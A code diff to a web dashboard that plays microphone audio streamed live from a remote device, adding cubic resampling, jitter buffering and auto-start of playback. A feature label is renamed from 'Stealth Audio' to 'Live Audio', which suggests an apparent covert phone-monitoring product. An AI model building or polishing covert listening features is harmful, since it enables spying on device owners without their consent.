@@ -188,11 +188,23 @@ export default function Home() {
     const audioAnimFrameRef = useRef<number>(0);
     const audioTimerRef = useRef<NodeJS.Timeout | null>(null);
     // Ring Buffer for continuous audio playback (like phone calls)
-    const audioRingBufRef = useRef<Float32Array>(new Float32Array(16000 * 10)); // 10 sec capacity
+    // Sized at startLiveAudio() based on the actual ctx.sampleRate (browsers ignore the 16000 hint on Windows/macOS).
+    const audioRingBufRef = useRef<Float32Array>(new Float32Array(48000 * 10));
     const audioRingWriteRef = useRef<number>(0);
     const audioRingReadRef = useRef<number>(0);
     const audioRingSamplesRef = useRef<number>(0);
     const audioProcessorRef = useRef<ScriptProcessorNode | null>(null);
+    // Source rate from device (Android sends 16kHz PCM). Output rate is whatever the browser gives us.
+    const audioSrcRateRef = useRef<number>(16000);
+    const audioOutRateRef = useRef<number>(48000);
+    // Cubic interpolation resampler state
+    const audioResampPosRef = useRef<number>(0);
+    const audioResampHistRef = useRef<Float32Array>(new Float32Array(4)); // s0,s1,s2,s3 for cubic
+    const audioResampHistIdxRef = useRef<number>(0);
+    // Jitter-buffer warm-up: don't start pulling until we have ~300ms queued, and hold last sample on underrun (PLC)
+    const audioWarmedRef = useRef<boolean>(false);
+    const audioLastSampleRef = useRef<number>(0);
+    const audioUnderrunCountRef = useRef<number>(0);
 
     // Custom Alert Modal State
     const [showCustomAlert, setShowCustomAlert] = useState(false);
@@ -503,36 +515,155 @@ export default function Home() {
                 }
             });
 
-            // Live Audio — Ring Buffer Writer
-            // Instead of scheduling individual AudioBufferSourceNodes (which causes gaps/drops/loops),
-            // we write incoming PCM samples into a ring buffer. A ScriptProcessorNode continuously
-            // PULLS from this buffer at a steady rate, exactly like how a phone call works.
+            // Live Audio — Ring Buffer Writer with cubic-interpolation resampling.
+            // Incoming PCM is 16kHz from the device, but AudioContext usually runs at 48kHz
+            // (browsers ignore the sampleRate hint on Windows/macOS). Without resampling here,
+            // playback was effectively 3x too fast → constant underruns → choppy/clicky sound.
             socket.on("live_audio", (data: any) => {
                 if (!data.chunk) return;
+
+                // Auto-create AudioContext on first chunk — playback starts as soon as device sends audio
+                if (!audioContextRef.current) {
+                    try {
+                        const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
+                        const outRate = ctx.sampleRate;
+                        const gainNode = ctx.createGain();
+                        const analyser = ctx.createAnalyser();
+                        analyser.fftSize = 256;
+                        gainNode.gain.value = 0.8;
+                        gainNode.connect(analyser);
+                        analyser.connect(ctx.destination);
+
+                        const processor = ctx.createScriptProcessor(2048, 0, 1);
+
+                        audioRingBufRef.current = new Float32Array(Math.ceil(outRate * 10));
+                        audioRingWriteRef.current = 0;
+                        audioRingReadRef.current = 0;
+                        audioRingSamplesRef.current = 0;
+                        audioSrcRateRef.current = 16000;
+                        audioOutRateRef.current = outRate;
+                        audioResampPosRef.current = 0;
+                        audioResampHistRef.current = new Float32Array(4);
+                        audioResampHistIdxRef.current = 0;
+                        audioWarmedRef.current = false;
+                        audioLastSampleRef.current = 0;
+                        audioUnderrunCountRef.current = 0;
+
+                        const warmupSamples = Math.floor(outRate * 0.3);
+
+                        processor.onaudioprocess = (e: AudioProcessingEvent) => {
+                            const output = e.outputBuffer.getChannelData(0);
+                            const ring = audioRingBufRef.current;
+                            const capacity = ring.length;
+
+                            if (!audioWarmedRef.current) {
+                                if (audioRingSamplesRef.current >= warmupSamples) {
+                                    audioWarmedRef.current = true;
+                                    audioUnderrunCountRef.current = 0;
+                                } else {
+                                    output.fill(0);
+                                    return;
+                                }
+                            }
+
+                            for (let i = 0; i < output.length; i++) {
+                                if (audioRingSamplesRef.current > 0) {
+                                    const s = ring[audioRingReadRef.current];
+                                    output[i] = s;
+                                    audioLastSampleRef.current = s;
+                                    audioRingReadRef.current = (audioRingReadRef.current + 1) % capacity;
+                                    audioRingSamplesRef.current--;
+                                    audioUnderrunCountRef.current = 0;
+                                } else {
+                                    audioUnderrunCountRef.current++;
+                                    const decayed = audioLastSampleRef.current * 0.97;
+                                    output[i] = decayed;
+                                    audioLastSampleRef.current = decayed;
+                                    if (audioUnderrunCountRef.current > Math.floor(outRate * 0.05)) {
+                                        audioWarmedRef.current = false;
+                                    }
+                                }
+                            }
+                        };
+
+                        processor.connect(gainNode);
+
+                        audioContextRef.current = ctx;
+                        audioGainRef.current = gainNode;
+                        audioAnalyserRef.current = analyser;
+                        audioProcessorRef.current = processor;
+
+                        setIsLiveAudio(true);
+                        setAudioError(null);
+                        setAudioElapsed(0);
+                        audioTimerRef.current = setInterval(() => {
+                            setAudioElapsed(prev => prev + 1);
+                        }, 1000);
+
+                        // Resume AudioContext if browser suspended it
+                        if (ctx.state === 'suspended') ctx.resume();
+                    } catch (e) {
+                        console.error('[Audio] Failed to auto-create AudioContext:', e);
+                    }
+                }
+
                 try {
-                    // Decode base64 → Int16 → Float32
                     const binaryStr = atob(data.chunk);
                     const bytes = new Uint8Array(binaryStr.length);
                     for (let i = 0; i < binaryStr.length; i++) bytes[i] = binaryStr.charCodeAt(i);
                     const int16 = new Int16Array(bytes.buffer);
-                    
+
                     const ring = audioRingBufRef.current;
                     const capacity = ring.length;
-                    
-                    // Write samples into ring buffer
+                    const srcRate = audioSrcRateRef.current;
+                    const outRate = audioOutRateRef.current;
+                    const ratio = outRate / srcRate; // e.g. 48000/16000 = 3 output samples per input
+
+                    const hist = audioResampHistRef.current;
+                    let histIdx = audioResampHistIdxRef.current;
+                    let pos = audioResampPosRef.current;
+
                     for (let i = 0; i < int16.length; i++) {
-                        ring[audioRingWriteRef.current] = int16[i] / 32768.0;
-                        audioRingWriteRef.current = (audioRingWriteRef.current + 1) % capacity;
-                        
-                        if (audioRingSamplesRef.current < capacity) {
-                            audioRingSamplesRef.current++;
-                        } else {
-                            // Buffer full — drop oldest sample (advance read pointer)
-                            audioRingReadRef.current = (audioRingReadRef.current + 1) % capacity;
+                        const sample = int16[i] / 32768.0;
+                        // Push into history ring (4 samples for cubic: s0,s1,s2,s3)
+                        hist[histIdx & 3] = sample;
+                        histIdx++;
+
+                        // Emit output samples using cubic (Catmull-Rom) interpolation
+                        // We have enough history after 4+ samples pushed
+                        if (histIdx >= 4) {
+                            const s0 = hist[(histIdx - 4) & 3];
+                            const s1 = hist[(histIdx - 3) & 3];
+                            const s2 = hist[(histIdx - 2) & 3];
+                            const s3 = hist[(histIdx - 1) & 3];
+
+                            while (pos < 1.0) {
+                                const t = pos;
+                                const t2 = t * t;
+                                const t3 = t2 * t;
+                                // Catmull-Rom spline
+                                const out = 0.5 * (
+                                    (2 * s1) +
+                                    (-s0 + s2) * t +
+                                    (2 * s0 - 5 * s1 + 4 * s2 - s3) * t2 +
+                                    (-s0 + 3 * s1 - 3 * s2 + s3) * t3
+                                );
+                                ring[audioRingWriteRef.current] = Math.max(-1, Math.min(1, out));
+                                audioRingWriteRef.current = (audioRingWriteRef.current + 1) % capacity;
+                                if (audioRingSamplesRef.current < capacity) {
+                                    audioRingSamplesRef.current++;
+                                } else {
+                                    audioRingReadRef.current = (audioRingReadRef.current + 1) % capacity;
+                                }
+                                pos += 1.0 / ratio;
+                            }
+                            pos -= 1.0;
                         }
                     }
-                    
-                    // Update VU meter from the incoming chunk
+                    audioResampHistIdxRef.current = histIdx;
+                    audioResampPosRef.current = pos;
+
+                    // VU meter from the raw incoming 16k chunk
                     let sum = 0;
                     for (let i = 0; i < int16.length; i++) {
                         const s = int16[i] / 32768.0;
@@ -793,84 +924,8 @@ export default function Home() {
             return;
         }
 
-        // Create AudioContext at 16kHz (matches our PCM sample rate — no resampling needed)
-        const ctx = new (window.AudioContext || (window as any).webkitAudioContext)({ sampleRate: 16000 });
-        const gainNode = ctx.createGain();
-        const analyser = ctx.createAnalyser();
-        analyser.fftSize = 256;
-        gainNode.gain.value = isMuted ? 0 : audioVolume / 100;
-        gainNode.connect(analyser);
-        analyser.connect(ctx.destination);
-
-        // ── Ring Buffer Pull-based Playback (like a real phone call) ──
-        // ScriptProcessorNode continuously pulls samples from the ring buffer.
-        // This guarantees smooth, gap-free audio regardless of network jitter.
-        const processor = ctx.createScriptProcessor(2048, 0, 1); // 0 inputs, 1 output (mono), 2048 frame buffer
-        
-        // Reset ring buffer state
-        audioRingBufRef.current = new Float32Array(16000 * 10);
-        audioRingWriteRef.current = 0;
-        audioRingReadRef.current = 0;
-        audioRingSamplesRef.current = 0;
-        
-        processor.onaudioprocess = (e: AudioProcessingEvent) => {
-            const output = e.outputBuffer.getChannelData(0);
-            const ring = audioRingBufRef.current;
-            const capacity = ring.length;
-            
-            for (let i = 0; i < output.length; i++) {
-                if (audioRingSamplesRef.current > 0) {
-                    output[i] = ring[audioRingReadRef.current];
-                    audioRingReadRef.current = (audioRingReadRef.current + 1) % capacity;
-                    audioRingSamplesRef.current--;
-                } else {
-                    output[i] = 0; // Silence when buffer is empty (underrun)
-                }
-            }
-        };
-        
-        processor.connect(gainNode);
-        
-        audioContextRef.current = ctx;
-        audioGainRef.current = gainNode;
-        audioAnalyserRef.current = analyser;
-        audioProcessorRef.current = processor;
-
-        // Start elapsed timer
-        setAudioElapsed(0);
-        audioTimerRef.current = setInterval(() => {
-            setAudioElapsed(prev => prev + 1);
-        }, 1000);
-
-        // Start visualizer
-        const drawVisualizer = () => {
-            const canvas = audioCanvasRef.current;
-            const an = audioAnalyserRef.current;
-            if (!canvas || !an) return;
-            const canvasCtx = canvas.getContext('2d');
-            if (!canvasCtx) return;
-
-            const bufferLength = an.frequencyBinCount;
-            const dataArray = new Uint8Array(bufferLength);
-            an.getByteFrequencyData(dataArray);
-
-            const w = canvas.width;
-            const h = canvas.height;
-            canvasCtx.clearRect(0, 0, w, h);
-
-            const barWidth = (w / bufferLength) * 2.5;
-            let x = 0;
-            for (let i = 0; i < bufferLength; i++) {
-                const barHeight = (dataArray[i] / 255) * h;
-                const hue = 180 + (i / bufferLength) * 60;
-                canvasCtx.fillStyle = `hsla(${hue}, 90%, 60%, 0.9)`;
-                canvasCtx.fillRect(x, h - barHeight, barWidth - 1, barHeight);
-                x += barWidth;
-            }
-            audioAnimFrameRef.current = requestAnimationFrame(drawVisualizer);
-        };
-        audioAnimFrameRef.current = requestAnimationFrame(drawVisualizer);
-
+        // AudioContext will be auto-created when first live_audio chunk arrives.
+        // Just tell the device to start sending audio.
         socket.emit('start_live_audio', {
             uuid: session.user.uuid,
             targetDeviceId: selectedDeviceId,
@@ -878,7 +933,7 @@ export default function Home() {
         });
         setIsLiveAudio(true);
         setAudioError(null);
-    }, [socket, selectedDeviceId, session, userPlan, audioVolume, isMuted]);
+    }, [socket, selectedDeviceId, session, userPlan]);
 
     const stopLiveAudio = useCallback(() => {
         if (socket && selectedDeviceId && session?.user?.uuid) {
@@ -2214,7 +2269,7 @@ END:VCARD`;
                                         <svg className="w-5 h-5 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                                     </div>
                                     <div>
-                                        <h4 className="text-sm font-medium text-emerald-300 mb-1">Stealth Audio</h4>
+                                        <h4 className="text-sm font-medium text-emerald-300 mb-1">Live Audio</h4>
                                         <p className="text-xs text-white/40 leading-relaxed">
                                             Captures device microphone audio in real-time. Audio is streamed via encrypted WebSocket with noise suppression and auto gain control enabled for crystal clear listening.
                                         </p>
